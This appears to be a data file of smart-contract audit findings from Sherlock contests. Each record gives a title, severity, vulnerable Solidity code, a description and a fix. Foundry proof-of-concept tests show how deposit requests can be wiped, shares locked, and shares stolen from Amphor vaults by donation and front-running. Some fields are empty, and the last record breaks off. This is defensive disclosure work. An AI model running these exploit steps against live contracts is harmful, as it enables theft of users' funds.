Claim functions don't validate if the epoch is settledчhighч```\nfunction _claimDeposit(\n    address owner,\n    address receiver\n)\n    internal\n    returns (uint256 shares)\n{\n    shares = previewClaimDeposit(owner);\n\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    epochs[lastRequestId].depositRequestBalance[owner] = 0;\n    _update(address(claimableSilo), receiver, shares);\n    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);\n}\n\nfunction previewClaimDeposit(address owner) public view returns (uint256) {\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);\n}\n\nfunction _convertToShares(\n    uint256 assets,\n    uint256 requestId,\n    Math.Rounding rounding\n)\n    internal\n    view\n    returns (uint256)\n{\n    if (isCurrentEpoch(requestId)) {\n        return 0;\n    }\n    uint256 totalAssets =\n        epochs[requestId].totalAssetsSnapshotForDeposit + 1;\n    uint256 totalSupply =\n        epochs[requestId].totalSupplySnapshotForDeposit + 1;\n\n    return assets.mulDiv(totalSupply, totalAssets, rounding);\n}\n```\nч"Both claim functions fail to validate if the epoch for the request has been already settled, leading to loss of funds when claiming requests for the current epoch. The issue is worsened as `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any account, allowing an attacker to wipe other's requests.\nWhen the vault is closed, users can request a deposit, transfer assets and later claim shares, or request a redemption, transfer shares and later redeem assets. Both of these processes store the assets or shares, and later convert these when the epoch is settled. For deposits, the core of the implementation is given by _claimDeposit():\n```\nfunction _claimDeposit(\n    address owner,\n    address receiver\n)\n    internal\n    returns (uint256 shares)\n{\n    shares = previewClaimDeposit(owner);\n\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    epochs[lastRequestId].depositRequestBalance[owner] = 0;\n    _update(address(claimableSilo), receiver, shares);\n    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);\n}\n\nfunction previewClaimDeposit(address owner) public view returns (uint256) {\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);\n}\n\nfunction _convertToShares(\n    uint256 assets,\n    uint256 requestId,\n    Math.Rounding rounding\n)\n    internal\n    view\n    returns (uint256)\n{\n    if (isCurrentEpoch(requestId)) {\n        return 0;\n    }\n    uint256 totalAssets =\n        epochs[requestId].totalAssetsSnapshotForDeposit + 1;\n    uint256 totalSupply =\n        epochs[requestId].totalSupplySnapshotForDeposit + 1;\n\n    return assets.mulDiv(totalSupply, totalAssets, rounding);\n}\n```\n\nAnd for redemptions in _claimRedeem():\n```\nfunction _claimRedeem(\n    address owner,\n    address receiver\n)\n    internal\n    whenNotPaused\n    returns (uint256 assets)\n{\n    assets = previewClaimRedeem(owner);\n    uint256 lastRequestId = lastRedeemRequestId[owner];\n    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n    epochs[lastRequestId].redeemRequestBalance[owner] = 0;\n    _asset.safeTransferFrom(address(claimableSilo), address(this), assets);\n    _asset.transfer(receiver, assets);\n    emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);\n}\n\nfunction previewClaimRedeem(address owner) public view returns (uint256) {\n    uint256 lastRequestId = lastRedeemRequestId[owner];\n    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n    return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);\n}\n\nfunction _convertToAssets(\n    uint256 shares,\n    uint256 requestId,\n    Math.Rounding rounding\n)\n    internal\n    view\n    returns (uint256)\n{\n    if (isCurrentEpoch(requestId)) {\n        return 0;\n    }\n    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;\n    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;\n\n    return shares.mulDiv(totalAssets, totalSupply, rounding);\n}\n```\n\nNote that in both cases the ""preview"" functions are used to convert and calculate the amounts owed to the user: `_convertToShares()` and `_convertToAssets()` use the settled values stored in `epochs[requestId]` to convert between assets and shares.\nHowever, there is no validation to check if the claiming is done for the current unsettled epoch. If a user claims a deposit or redemption during the same epoch it has been requested, the values stored in `epochs[epochId]` will be uninitialized, which means that `_convertToShares()` and `_convertToAssets()` will use zero values leading to zero results too. The claiming process will succeed, but since the converted amounts are zero, the users will always get zero assets or shares.\nThis is even worsened by the fact that `claimAndRequestDeposit()` can be used to claim a deposit on behalf of any `account`. An attacker can wipe any requested deposit from an arbitrary `account` by simply calling claimAndRequestDeposit(0, `account`, """"). This will internally execute `_claimDeposit(account, account)`, which will trigger the described issue.\nThe following proof of concept demonstrates the scenario in which a user claims their own deposit during the current epoch:\n```\nfunction test_ClaimSameEpochLossOfFunds_Scenario_A() public {\n    asset.mint(alice, 1_000e18);\n\n    vm.prank(alice);\n    vault.deposit(500e18, alice);\n\n    // vault is closed\n    vm.prank(owner);\n    vault.close();\n\n    // alice requests a deposit\n    vm.prank(alice);\n    vault.requestDeposit(500e18, alice, alice, """");\n\n    // the request is successfully created\n    assertEq(vault.pendingDepositRequest(alice), 500e18);\n\n    // now alice claims the deposit while vault is still open\n    vm.prank(alice);\n    vault.claimDeposit(alice);\n\n    // request is gone\n    assertEq(vault.pendingDepositRequest(alice), 0);\n}\n```\n\nThis other proof of concept illustrates the scenario in which an attacker calls `claimAndRequestDeposit()` to wipe the deposit of another account.\n```\nfunction test_ClaimSameEpochLossOfFunds_Scenario_B() public {\n    asset.mint(alice, 1_000e18);\n\n    vm.prank(alice);\n    vault.deposit(500e18, alice);\n\n    // vault is closed\n    vm.prank(owner);\n    vault.close();\n\n    // alice requests a deposit\n    vm.prank(alice);\n    vault.requestDeposit(500e18, alice, alice, """");\n\n    // the request is successfully created\n    assertEq(vault.pendingDepositRequest(alice), 500e18);\n\n    // bob can issue a claim for alice through claimAndRequestDeposit()\n    vm.prank(bob);\n    vault.claimAndRequestDeposit(0, alice, """");\n\n    // request is gone\n    assertEq(vault.pendingDepositRequest(alice), 0);\n}\n```\n"чCheck that the epoch associated with the request is not the current epoch.\n```\n    function _claimDeposit(\n        address owner,\n        address receiver\n    )\n        internal\n        returns (uint256 shares)\n    {\n// Add the line below\n       uint256 lastRequestId = lastDepositRequestId[owner];\n// Add the line below\n       if (isCurrentEpoch(lastRequestId)) revert();\n      \n        shares = previewClaimDeposit(owner);\n\n// Remove the line below\n       uint256 lastRequestId = lastDepositRequestId[owner];\n        uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n        epochs[lastRequestId].depositRequestBalance[owner] = 0;\n        _update(address(claimableSilo), receiver, shares);\n        emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);\n    }\n```\n\n```\n    function _claimRedeem(\n        address owner,\n        address receiver\n    )\n        internal\n        whenNotPaused\n        returns (uint256 assets)\n    {\n// Add the line below\n       uint256 lastRequestId = lastRedeemRequestId[owner];\n// Add the line below\n       if (isCurrentEpoch(lastRequestId)) revert();\n        \n        assets = previewClaimRedeem(owner);\n// Remove the line below\n       uint256 lastRequestId = lastRedeemRequestId[owner];\n        uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n        epochs[lastRequestId].redeemRequestBalance[owner] = 0;\n        _asset.safeTransferFrom(address(claimableSilo), address(this), assets);\n        _asset.transfer(receiver, assets);\n        emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);\n    }\n```\n\nDiscussion\nsherlock-admin4\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; high(1)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.чCRITICAL. Requests can be wiped by executing the claim in an unsettled epoch, leading to loss of funds. The issue can also be triggered for any arbitrary account by using `claimAndRequestDeposit()`.\nCode Snippet\nTool used\nManual Review
Calling `requestRedeem` with `_msgSender() != owner` will lead to user's shares being locked in the vault foreverчhighч"```\nfunction test_poc() external {\n        // set token balances\n        deal(vaultTested.asset(), user1.addr, 20); // owner\n\n        vm.startPrank(user1.addr);\n        IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 20);\n        // owner deposits tokens when vault is open and receives vault shares\n        vaultTested.deposit(20, user1.addr);\n        // owner delegates shares balance to user\n        IERC20Metadata(address(vaultTested)).approve(\n            user2.addr,\n            vaultTested.balanceOf(user1.addr)\n        );\n        vm.stopPrank();\n\n        // vault is closed\n        vm.prank(vaultTested.owner());\n        vaultTested.close();\n\n        // epoch = 1\n        vm.startPrank(user2.addr);\n        // user requests a redeem on behlaf of owner\n        vaultTested.requestRedeem(\n            vaultTested.balanceOf(user1.addr),\n            user2.addr,\n            user1.addr,\n            """"\n        );\n        // user checks the pending redeem request amount\n        assertEq(vaultTested.pendingRedeemRequest(user2.addr), 20);\n        vm.stopPrank();\n\n        vm.startPrank(vaultTested.owner());\n        IERC20Metadata(vaultTested.asset()).approve(\n            address(vaultTested),\n            type(uint256).max\n        );\n        vaultTested.settle(23); // an epoch goes by\n        vm.stopPrank();\n\n        // epoch = 2\n\n        vm.startPrank(user2.addr);\n        // user tries to claim the redeem\n        vaultTested.claimRedeem(user2.addr);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);\n        // however, token balance of user is still empty\n        vm.stopPrank();\n\n        vm.startPrank(user1.addr);\n        // owner also tries to claim the redeem\n        vaultTested.claimRedeem(user1.addr);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n        // however, token balance of owner is still empty\n        vm.stopPrank();\n\n        // all the balances of owner and user are zero, indicating loss of funds\n        assertEq(vaultTested.balanceOf(user1.addr), 0);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n        assertEq(vaultTested.balanceOf(user2.addr), 0);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);\n    }\n```\n"ч"The `_createRedeemRequest` function contains a discrepancy; it fails to update the `lastRedeemRequestId` for the user eligible to claim the shares upon maturity. Instead, it updates this identifier for the 'owner' who delegated their shares to the user. As a result, the shares become permanently locked in the vault, rendering them unclaimable by either the 'owner' or the user.\nThis issue unfolds as follows:\nThe 'owner' deposits tokens into the vault, receiving vault `shares` in return.\nThe 'owner' then delegates the allowance of all their vault `shares` to another user.\nWhen `epochId == 1`, this user executes The `requestRedeem` , specifying the 'owner''s address as `owner`, the user's address as `receiver`, and the 'owner''s share balance as `shares`.\nThe internal function `_createRedeemRequest` is invoked, incrementing `epochs[epochId].redeemRequestBalance[receiver]` by the amount of `shares`, and setting `lastRedeemRequestId[owner] = epochId`.\nAt `epochId == 2`, the user calls `claimRedeem`, which in turn calls the internal function `_claimRedeem`, with `owner` set to `_msgSender()` (i.e., the user's address) and `receiver` also set to the user's address.\nIn this scenario, `lastRequestId` remains zero because `lastRedeemRequestId[owner] == 0` (here, `owner` refers to the user's address). Consequently, `epochs[lastRequestId].redeemRequestBalance[owner]` is also zero. Therefore, no `shares` are minted to the user.\nProof of Code :\nThe following test demonstrates the claim made above :\n```\nfunction test_poc() external {\n        // set token balances\n        deal(vaultTested.asset(), user1.addr, 20); // owner\n\n        vm.startPrank(user1.addr);\n        IERC20Metadata(vaultTested.asset()).approve(address(vaultTested), 20);\n        // owner deposits tokens when vault is open and receives vault shares\n        vaultTested.deposit(20, user1.addr);\n        // owner delegates shares balance to user\n        IERC20Metadata(address(vaultTested)).approve(\n            user2.addr,\n            vaultTested.balanceOf(user1.addr)\n        );\n        vm.stopPrank();\n\n        // vault is closed\n        vm.prank(vaultTested.owner());\n        vaultTested.close();\n\n        // epoch = 1\n        vm.startPrank(user2.addr);\n        // user requests a redeem on behlaf of owner\n        vaultTested.requestRedeem(\n            vaultTested.balanceOf(user1.addr),\n            user2.addr,\n            user1.addr,\n            """"\n        );\n        // user checks the pending redeem request amount\n        assertEq(vaultTested.pendingRedeemRequest(user2.addr), 20);\n        vm.stopPrank();\n\n        vm.startPrank(vaultTested.owner());\n        IERC20Metadata(vaultTested.asset()).approve(\n            address(vaultTested),\n            type(uint256).max\n        );\n        vaultTested.settle(23); // an epoch goes by\n        vm.stopPrank();\n\n        // epoch = 2\n\n        vm.startPrank(user2.addr);\n        // user tries to claim the redeem\n        vaultTested.claimRedeem(user2.addr);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);\n        // however, token balance of user is still empty\n        vm.stopPrank();\n\n        vm.startPrank(user1.addr);\n        // owner also tries to claim the redeem\n        vaultTested.claimRedeem(user1.addr);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n        // however, token balance of owner is still empty\n        vm.stopPrank();\n\n        // all the balances of owner and user are zero, indicating loss of funds\n        assertEq(vaultTested.balanceOf(user1.addr), 0);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user1.addr), 0);\n        assertEq(vaultTested.balanceOf(user2.addr), 0);\n        assertEq(IERC20Metadata(vaultTested.asset()).balanceOf(user2.addr), 0);\n    }\n```\n\nTo run the test :"чModify `_createRedeemRequest` as follows :\n```\n// Remove the line below\n        lastRedeemRequestId[owner] = epochId;\n// Add the line below\n       lastRedeemRequestid[receiver] = epochId;\n```\n\nDiscussion\nsherlock-admin3\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\ninvalid\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.чThe shares are locked in the vault forever with no method for recovery by the user or the 'owner'.\nCode Snippet\nTool used\nManual Review Foundry
Exchange rate is calculated incorrectly when the vault is closed, potentially leading to funds being stolenчhighч```\n// rest of code\nuint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;\nuint256 totalSupplySnapshotForDeposit = totalSupply + 1;\n// rest of code\nuint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;\nuint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;\n// rest of code\n```\nч"The exchange ratio between shares and assets is calculated incorrectly when the vault is closed. This can cause accounting inconsistencies, funds being stolen and users being unable to redeem shares.\nThe functions AsyncSynthVault::_convertToAssets and AsyncSynthVault::_convertToShares both add `1` to the epoch cached variables `totalAssetsSnapshotForDeposit`, `totalSupplySnapshotForDeposit`, `totalAssetsSnapshotForRedeem` and `totalSupplySnapshotForRedeem`.\nThis is incorrect because the function previewSettle, used in _settle(), already adds `1` to the variables:\n```\n// rest of code\nuint256 totalAssetsSnapshotForDeposit = _lastSavedBalance + 1;\nuint256 totalSupplySnapshotForDeposit = totalSupply + 1;\n// rest of code\nuint256 totalAssetsSnapshotForRedeem = _lastSavedBalance + pendingDeposit + 1;\nuint256 totalSupplySnapshotForRedeem = totalSupply + sharesToMint + 1;\n// rest of code\n```\n\nThis leads to accounting inconsistencies between depositing/redeeming when a vault is closed and depositing/redeeming when a vault is open whenever the exchange ratio assets/shares is not exactly 1:1.\nIf a share is worth more than one asset:\nUsers that will request a deposit while the vault is closed will receive more shares than they should\nUsers that will request a redeem while the vault is closed will receive less assets than they should\nPOC\nThis can be taken advantage of by an attacker by doing the following:\nThe attacker monitors the mempool for a vault deployment.\nBefore the vault is deployed the attacker transfers to the vault some of the vault underlying asset (donation). This increases the value of one share.\nThe protocol team initializes the vault and adds the bootstrap liquidity.\nUsers use the protocol normally and deposits some assets.\nThe vault gets closed by the protocol team and the funds invested.\nSome users request a deposit while the vault is closed.\nThe attacker monitors the mempool to know when the vault will be open again.\nRight before the vault is opened, the attacker performs multiple deposit requests with different accounts. For each account he deposits the minimum amount of assets required to receive 1 share.\nThe vault opens.\nThe attacker claims all of the deposits with every account and then redeems the shares immediately for profit.\nThis will ""steal"" shares of other users (point 6) from the claimable silo because the protocol will give the attacker more shares than it should. The attacker will profit and some users won't be able to claim their shares.\nand copy-paste:\n```\nfunction test_attackerProfitsViaRequestingDeposits() external {\n    address attacker = makeAddr(""attacker"");\n    address protocolUsers = makeAddr(""alice"");\n    address vaultOwner = vaultTested.owner();\n\n    uint256 donation = 1e18 - 1;\n    uint256 protocolUsersDeposit = 10e18 + 15e18;\n    uint256 protocolTeamBootstrapDeposit = 1e18;\n\n    IERC20 asset = IERC20(vaultTested.asset());\n    deal(address(asset), protocolUsers, protocolUsersDeposit);\n    deal(address(asset), attacker, donation);\n    deal(address(asset), vaultOwner, protocolTeamBootstrapDeposit);\n\n    vm.prank(vaultOwner);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(protocolUsers);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    vm.prank(attacker);\n    asset.approve(address(vaultTested), type(uint256).max);\n\n    //-> Attacker donates `1e18 - 1` assets, this can be done before the vault is even deployed\n    vm.prank(attacker);\n    asset.transfer(address(vaultTested), donation);\n\n    //-> Protocol team bootstraps the vault with `1e18` of assets\n    vm.prank(vaultOwner);\n    vaultTested.deposit(protocolTeamBootstrapDeposit, vaultOwner);\n    \n    //-> Users deposit `10e18` of liquidity in the vault\n    vm.prank(protocolUsers);\n    vaultTested.deposit(10e18, protocolUsers);\n\n    //-> Vault gets closed\n    vm.prank(vaultOwner);\n    vaultTested.close();\n\n    //-> Users request deposits for `15e18` assets\n    vm.prank(protocolUsers);\n    vaultTested.requestDeposit(15e18, protocolUsers, protocolUsers, """");\n\n    //-> The attacker frontruns the call to `open()` and knows that:\n    //- The current epoch cached `totalSupply` of shares will be `vaultTested.totalSupply()` + 1 + 1\n    //- The current epoch cached `totalAssets` will be 12e18 + 1 + 1\n    uint256 totalSupplyCachedOnOpen = vaultTested.totalSupply() + 1 + 1; //Current supply of shares, plus 1 used as virtual share, plus 1 added by `_convertToAssets`\n    uint256 totalAssetsCachedOnOpen = vaultTested.lastSavedBalance() + 1 + 1; //Total assets passed as paremeter to `open`, plus 1 used as virtual share, plus 1 added by `_convertToAssets`\n    uint256 minToDepositToGetOneShare = totalAssetsCachedOnOpen / totalSupplyCachedOnOpen;\n\n    //-> Attacker frontruns the call to `open()` by requesting a deposit with multiple fresh accounts\n    uint256 totalDeposited = 0;\n    for(uint256 i = 0; i < 30; i++) {\n        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones\n        deal(address(asset), attackerEOA, minToDepositToGetOneShare);\n        vm.startPrank(attackerEOA);\n        asset.approve(address(vaultTested), type(uint256).max);\n        vaultTested.requestDeposit(minToDepositToGetOneShare, attackerEOA, attackerEOA, """");\n        vm.stopPrank();\n        totalDeposited += minToDepositToGetOneShare;\n    }\n\n    //->Vault gets opened again with 0 profit and 0 losses (for simplicity)\n    vm.startPrank(vaultOwner);\n    vaultTested.open(vaultTested.lastSavedBalance());\n    vm.stopPrank();\n\n    //-> Attacker claims his deposits and withdraws them immediately for profit\n    uint256 totalRedeemed = 0;\n    for(uint256 i = 0; i < 30; i++) {\n        address attackerEOA = address(uint160(i * 31000 + 49*49)); //Random address that does not conflict with existing ones\n        vm.startPrank(attackerEOA);\n        vaultTested.claimDeposit(attackerEOA);\n        uint256 assets = vaultTested.redeem(vaultTested.balanceOf(attackerEOA), attackerEOA, attackerEOA);\n        vm.stopPrank();\n        totalRedeemed += assets;\n    }\n\n    //->❌ Attacker is in profit\n    assertGt(totalRedeemed, totalDeposited + donation);\n}\n```\n"ч"In the functions AsyncSynthVault::_convertToAssets and AsyncSynthVault::_convertToShares:\nReturn `0` if requestId == `0`\nDon't add `1` to the two cached variables\nIt's also a good idea to perform the initial bootstrapping deposit in the initialize function (as suggested in another finding) and require that the vault contains `0` assets when the first deposit is performed.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/104.\n0xLogos\nEscalate\nLow (at least medium)\nI doubt that there's any profit +1 even in 6 dp is too small frontrunning and gas on mainnet too expensive, not possible on polygon zkevm\nsherlock-admin2\nEscalate\nLow (at least medium)\nI doubt that there's any profit +1 even in 6 dp is too small frontrunning and gas on mainnet too expensive, not possible on polygon zkevm\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nrealfugazzi\nEscalate\nLow (at least medium)\nI doubt that there's any profit +1 even in 6 dp is too small frontrunning and gas on mainnet too expensive, not possible on polygon zkevm\nTake into account that this issue is not just about small differences of amounts in calculations, but could break redemptions accidentally since the amounts are off and eventually people cannot claim back their intents. #73 goes into this and offers a detailed PoC.\n0xLogos\nI see, but it's not permanent lock of funds thus not loss of funds so I think medium is apropriate severity.\nWangSecurity\nThe reason why we decided to make it high severity, cause it's a normal workflow to open/close the vault, therefore, there are no certain external conditions for this, it will just happen even if the protocol operates in a normal way.\nSo the absence of any external factors is the reason it's high. Both LSW and the sponsor agreed on it.\n0xLogos\n\nI believe only ""core functionality break"" apropriate here according to rules.\n(About #73) Admins can easily recover funds by close vault => request dust amount => settle => silo now has enough shares.\nMihir018\nI agree with @WangSecurity and I also concerned with @blablalf regarding if this is a normal flow of operation during contest and they agreed on that. And it would also result in definite loss of funds without external conditions due to calculation flow implemented.\nWangSecurity\nI see the point that 0xLogos raises here, but I still believe it should remain high, cause the users would lose funds due to just interacting with the protocol, nothing else is required, it's just the normal workflow, therefore, I think it should be high.\nEvert0x\nIt looks like we agree that core functionality is being broken, but there is a disagreement if that would result in lost funds.\n@0xLogos\nTake into account that this issue is not just about small differences of amounts in calculations, but could break redemptions accidentally since the amounts are off and eventually people cannot claim back their intents.\nDoes this argument convince you that this issue can result in lost funds?\nzzykxx\nThe POC I coded proves funds can be stolen by abusing an implementation mistake that leads to a rounding error in favor of users.\nThis issue should be judged high severity for consistency given that this one (which has the same pre-conditions, with the exception that in this case the admin doesn't have to approve every single withdrawal) has been judged as high severity.\nEvert0x\nPlanning to reject escalation and keep issue state as is\n0xLogos\n```\n//->❌ Attacker is in profit\nassertGt(totalRedeemed, totalDeposited + donation);\n```\n\nWhat is exact profit in this case? If it greater by 1 wei or so loss of funds doesn't make sense here\n0xLogos\nDoes this argument convince you that this issue can result in lost funds?\nNo, as I said, its not permanent loss, it could be easily recovered by admin or accidentely. Also I think ""normal workflow"" wording can lead to misunderstanding here: PoC has certain hardcoded numbers and it can be simply edge case.\nrealfugazzi\nDoes this argument convince you that this issue can result in lost funds?\nNo, as I said, its not permanent loss, it could be easily recovered by admin or accidentely. Also I think ""normal workflow"" wording can lead to misunderstanding here: PoC has certain hardcoded numbers and it can be simply edge case.\nThen it is a loss for the admins, moving the loss from one entity to another doesn't take away the loss.\nImagine there is a protocol that gets hacked, and the funds are returned back to their rightful owners via the protocol treasury, wouldn't you classify this as a loss?\nzzykxx\nI will just say 3 things:\nThe POC shows the profit for the attacker is 1.69ETH\nThe POC shows the funds are in the attacker wallet and cannot be recovered\nPeople should at least run the POC before escalating\nEvert0x\nStill planning to reject escalation and keep issue state as is. The escalation and follow up comments fail to provide a detailed reason to invalidate the issue.\nEvert0x\nResult: High Has Duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\n0xLogos: rejected"ч"When the ratio between shares and assets is not 1:1 the protocol calculates the exchange rate between assets and shares inconsitently. This is an issue by itself and can lead to loss of funds and users not being able to claim shares. It can also be taken advantage of by an attacker to steal shares from the claimable silo.\nNote that the ""donation"" done initially is not akin to an ""inflation"" attack because the attacker is not required to mint any share.\nCode Snippet\nTool used\nManual Review"
The `_zapIn` function may unexpectedly revert due to the incorrect implementation of `_transferTokenInAndApprove`чmediumч```\n    function _transferTokenInAndApprove(\n        address router,\n        IERC20 tokenIn,\n        uint256 amount\n    )\n        internal\n    {\n        tokenIn.safeTransferFrom(_msgSender(), address(this), amount);\n//@ The check of allowance is useless, we should check the allowance from address(this) rather than the msgSender\n        if (tokenIn.allowance(_msgSender(), router) < amount) {\n            tokenIn.forceApprove(router, amount);\n        }\n    }\n```\nчThe `_transferTokenInAndApprove` function should approve the `router` on behalf of the VaultZapper contract. However, it checks the allowance from `msgSender` to the `router`, rather than the VaultZapper. This potentially results in the VaultZapper not approving the `router` and causing unexpected reverting.\nThe allowance check in the `_transferTokenInAndApprove` function should verify that `address(this)` has approved sufficient amount of `tokenIn` to the `router`. However, it currently checks the allowance of `_msgSender()`, which is unnecessary and may cause transaction reverting if `_msgSender` had previously approved the `router`.\n```\n    function _transferTokenInAndApprove(\n        address router,\n        IERC20 tokenIn,\n        uint256 amount\n    )\n        internal\n    {\n        tokenIn.safeTransferFrom(_msgSender(), address(this), amount);\n//@ The check of allowance is useless, we should check the allowance from address(this) rather than the msgSender\n        if (tokenIn.allowance(_msgSender(), router) < amount) {\n            tokenIn.forceApprove(router, amount);\n        }\n    }\n```\n\nPOC\nResult:чFix the issue:\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nseem valid; medium(3)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/AmphorProtocol/asynchronous-vault/pull/103.чThis issue could lead to transaction reverting when users interact with the contract normally, thereby affecting the contract's regular functionality.\nCode Snippet\nTool used\nFoundry
Unupdated totalBorrow After BigBang Liquidationчhighч```\n    function _liquidateUser(\n        address user,\n        uint256 maxBorrowPart,\n        IMarketLiquidatorReceiver _liquidatorReceiver,\n        bytes calldata _liquidatorReceiverData,\n        uint256 _exchangeRate,\n        uint256 minLiquidationBonus\n    ) private {\n        uint256 callerReward = _getCallerReward(user, _exchangeRate);\n\n        (uint256 borrowAmount,, uint256 collateralShare) =\n          _updateBorrowAndCollateralShare(user, maxBorrowPart, minLiquidationBonus, _exchangeRate);\n      totalCollateralShare = totalCollateralShare > collateralShare ? totalCollateralShare - collateralShare : 0;\n        uint256 borrowShare = yieldBox.toShare(assetId, borrowAmount, true);\n\n        (uint256 returnedShare,) =\n            _swapCollateralWithAsset(collateralShare, _liquidatorReceiver, _liquidatorReceiverData);\n        if (returnedShare < borrowShare) revert AmountNotValid();\n\n        (uint256 feeShare, uint256 callerShare) = _extractLiquidationFees(returnedShare, borrowShare, callerReward);\n\n        IUsdo(address(asset)).burn(address(this), borrowAmount);\n\n        address[] memory _users = new address[](1);\n        _users[0] = user;\n        emit Liquidated(msg.sender, _users, callerShare, feeShare, borrowAmount, collateralShare);\n    }\n\n    function _updateBorrowAndCollateralShare(\n        address user,\n        uint256 maxBorrowPart,\n        uint256 minLiquidationBonus, // min liquidation bonus to accept (default 0)\n        uint256 _exchangeRate\n    ) private returns (uint256 borrowAmount, uint256 borrowPart, uint256 collateralShare) {\n        if (_exchangeRate == 0) revert ExchangeRateNotValid();\n\n        // get collateral amount in asset's value\n        uint256 collateralPartInAsset = (\n            yieldBox.toAmount(collateralId, userCollateralShare[user], false) * EXCHANGE_RATE_PRECISION\n        ) / _exchangeRate;\n\n        // compute closing factor (liquidatable amount)\n        uint256 borrowPartWithBonus =\n            computeClosingFactor(userBorrowPart[user], collateralPartInAsset, FEE_PRECISION_DECIMALS);\n\n        // limit liquidable amount before bonus to the current debt\n        uint256 userTotalBorrowAmount = totalBorrow.toElastic(userBorrowPart[user], true);\n        borrowPartWithBonus = borrowPartWithBonus > userTotalBorrowAmount ? userTotalBorrowAmount : borrowPartWithBonus;\n\n        // check the amount to be repaid versus liquidator supplied limit\n        borrowPartWithBonus = borrowPartWithBonus > maxBorrowPart ? maxBorrowPart : borrowPartWithBonus;\n        borrowAmount = borrowPartWithBonus;\n\n        // compute part units, preventing rounding dust when liquidation is full\n        borrowPart = borrowAmount == userTotalBorrowAmount\n            ? userBorrowPart[user]\n            : totalBorrow.toBase(borrowPartWithBonus, false);\n        if (borrowPart == 0) revert Solvent();\n\n        if (liquidationBonusAmount > 0) {\n            borrowPartWithBonus = borrowPartWithBonus + (borrowPartWithBonus * liquidationBonusAmount) / FEE_PRECISION;\n        }\n\n        if (collateralPartInAsset < borrowPartWithBonus) {\n            if (collateralPartInAsset <= userTotalBorrowAmount) {\n                revert BadDebt();\n            }\n            // If current debt is covered by collateral fully\n            // then there is some liquidation bonus,\n            // so liquidation can proceed if liquidator's minimum is met\n            if (minLiquidationBonus > 0) {\n                // `collateralPartInAsset > borrowAmount` as `borrowAmount <= userTotalBorrowAmount`\n                uint256 effectiveBonus = ((collateralPartInAsset - borrowAmount) * FEE_PRECISION) / borrowAmount;\n                if (effectiveBonus < minLiquidationBonus) {\n                    revert InsufficientLiquidationBonus();\n                }\n                collateralShare = userCollateralShare[user];\n            } else {\n                revert InsufficientLiquidationBonus();\n            }\n        } else {\n            collateralShare =\n                yieldBox.toShare(collateralId, (borrowPartWithBonus * _exchangeRate) / EXCHANGE_RATE_PRECISION, false);\n            if (collateralShare > userCollateralShare[user]) {\n                revert NotEnoughCollateral();\n            }\n        }\n\n      userBorrowPart[user] -= borrowPart;\n      userCollateralShare[user] -= collateralShare;\n    }\n```\nчDuring the liquidation process, BigBang only reduces the user's `userBorrowPart[user]`, but fails to update the global `totalBorrow`. Consequently, all subsequent debt calculations are incorrect.\nCurrently, the implementation relies on the `BBLiquidation._updateBorrowAndCollateralShare()` method to calculate user debt repayment and collateral collection. The code snippet is as follows:\n```\n    function _liquidateUser(\n        address user,\n        uint256 maxBorrowPart,\n        IMarketLiquidatorReceiver _liquidatorReceiver,\n        bytes calldata _liquidatorReceiverData,\n        uint256 _exchangeRate,\n        uint256 minLiquidationBonus\n    ) private {\n        uint256 callerReward = _getCallerReward(user, _exchangeRate);\n\n        (uint256 borrowAmount,, uint256 collateralShare) =\n          _updateBorrowAndCollateralShare(user, maxBorrowPart, minLiquidationBonus, _exchangeRate);\n      totalCollateralShare = totalCollateralShare > collateralShare ? totalCollateralShare - collateralShare : 